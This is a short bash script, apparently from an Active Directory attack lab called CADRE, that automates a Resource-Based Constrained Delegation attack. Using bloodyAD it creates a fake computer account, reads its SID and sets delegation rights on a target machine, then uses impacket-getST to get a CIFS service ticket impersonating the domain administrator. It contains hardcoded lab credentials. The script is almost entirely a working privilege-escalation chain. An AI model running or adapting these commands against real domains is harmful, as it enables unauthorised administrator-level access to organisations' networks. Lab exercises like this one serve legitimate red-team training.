#!/bin/bash
# CADRE — WT#007 Resource-Based Constrained Delegation
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#007 — Resource-Based Constrained Delegation"
start_attack "007" "Resource-Based Constrained Delegation"

require_tool bloodyAD
require_env DC02 "DC02"
require_env DOMAIN_CHILD "DOMAIN_CHILD"

step "Step 1: Create fake computer account"
run_cmd "bloodyAD --host \"$DC02\" -d \"$DOMAIN_CHILD\" -u analyst_t1 -p 'T13r_An@lyst!' add computer 'FakePC\$' 'Password123!'"

step "Step 2: Retrieve SID of fake computer"
run_cmd "bloodyAD --host \"$DC02\" -d \"$DOMAIN_CHILD\" -u analyst_t1 -p 'T13r_An@lyst!' get object 'CN=FakePC,CN=Computers,DC=child,DC=cadre,DC=local' --attr objectSid"

step "Step 3: Set msDS-AllowedToActOnBehalfOfOtherIdentity on target"
run_cmd "bloodyAD --host \"$DC02\" -d \"$DOMAIN_CHILD\" -u analyst_t1 -p 'T13r_An@lyst!' set rbcd \"CN=TARGET_COMPUTER,CN=Computers,DC=child,DC=cadre,DC=local\" \"S-1-5-21-<DOMAIN_SID>-<FAKE_PC_RID>\""

step "Step 4: Obtain TGS ticket via RBCD (requires impacket)"
run_cmd "impacket-getST -spn 'cifs/TARGET_COMPUTER.child.cadre.local' \"$DOMAIN_CHILD/FakePC\$:Password123!\" -impersonate administrator -dc-ip $DC02"

result $? "RBCD attack completed"
